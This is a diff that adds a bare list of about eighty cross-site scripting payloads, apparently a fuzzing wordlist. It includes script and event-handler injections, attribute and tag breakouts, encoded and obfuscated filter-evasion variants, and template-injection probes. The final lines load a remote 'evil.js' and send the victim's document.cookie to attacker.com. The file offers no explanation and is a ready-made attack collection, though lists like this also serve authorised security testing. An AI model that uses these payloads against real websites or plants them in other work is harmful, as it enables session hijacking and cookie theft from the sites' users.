@@ -1,0 +1,79 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=1 onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert(document.cookie)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe src=javascript:alert(1)>
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:alert(document.cookie)>click</a>
+javascript:alert(1)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+</script><script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<svg><script>alert&#40;1&#41;</script></svg>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',9999)</script>
+<script>window['alert'](1)</script>
+<script>window['\x61\x6c\x65\x72\x74'](1)</script>
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+${{7*7}}
+{{constructor.constructor('alert(1)')()}}
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/></svg>
+<math><mtext></p><script>alert(1)</script></mtext></math>
+<table><td><script>alert(1)</script></table>
+<xss id=x tabindex=1 onfocus=alert(1) style=display:block>#x</xss>
+<style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)">
+<link rel=stylesheet href="data:text/css,*{color:red}">
+<base href="javascript:/a/-alert(1)///////">
+<form action="javascript:alert(1)"><input type=submit>
+<button formaction="javascript:alert(1)">XSS</button>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<s onmouseover=alert(1)>hover</s>
+<div onmouseover="alert(1)">hover me</div>
+<body onmousemove=alert(1)>
+<img lowsrc=x onerror=alert(1)>
+<img dynsrc=x onerror=alert(1)>
+<bgsound src=x onerror=alert(1)>
+<isindex action=javascript:alert(1) type=image>
+<image src=1 href=1 onerror="javascript:alert(1)">
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+</style><script>alert(1)</script>
+"><svg/onload=alert(1)//
+'onload='alert(1)
+" onmouseover="alert(1)" "
+' onmouseover='alert(1)' '
+<script src="https://example.com/evil.js"></script>
+<script>fetch('https://attacker.com/?c='+document.cookie)</script>
+<img src=x onerror=this.src='https://attacker.com/?c='+document.cookie>
+<svg onload="location='https://attacker.com/?c='+document.cookie">
